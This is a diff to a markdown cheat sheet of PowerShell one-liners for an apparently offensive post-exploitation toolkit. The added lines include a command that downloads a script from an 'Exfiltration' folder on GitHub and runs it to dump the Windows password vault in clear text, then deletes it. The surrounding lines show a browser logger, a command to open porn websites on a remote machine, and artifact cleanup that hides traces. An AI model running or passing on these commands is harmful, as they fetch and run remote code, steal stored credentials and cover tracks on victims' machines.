@@ -137,6 +137,11 @@ iwr -uri "https://raw.githubusercontent.com/r00t-3xp10it/redpill/main/bin/PingSw
 
 <br />
 
+#### Retrieve processes running
+```powershell
+Get-Process|Select-Object Id,ProcessName,Description,StartTime|Where-Object{$_.ProcessName -iNotMatch '(wlanext|svchost|RuntimeBroker|SrTasks)'}|Format-Table -AutoSize
+```
+
 #### Stop\Start remote processes
 ```powershell
 # Open porn websites
@@ -188,6 +193,13 @@ Get-Content -Path "Browser.report"|Select-String -Pattern 'Windows Title   :'
 # CleanUp artifacts
 Remove-Item BrowserLogger.ps1 -force
 Remove-Item Browser.report -force
+```
+
+<br />
+
+#### Dump password vault {clear-text}
+```powershell
+iwr -uri "https://raw.githubusercontent.com/r00t-3xp10it/redpill/main/lib/Exfiltration/Invoke-VaultCmd.ps1" -OutFile "Invoke-VaultCmd.ps1"|Unblock-File;powershell -File "Invoke-VaultCmd.ps1" -action "dump" -banner "true" -secure;Remove-Item -Path "Invoke-VaultCmd.ps1" -Force
 ```
 
 <br />
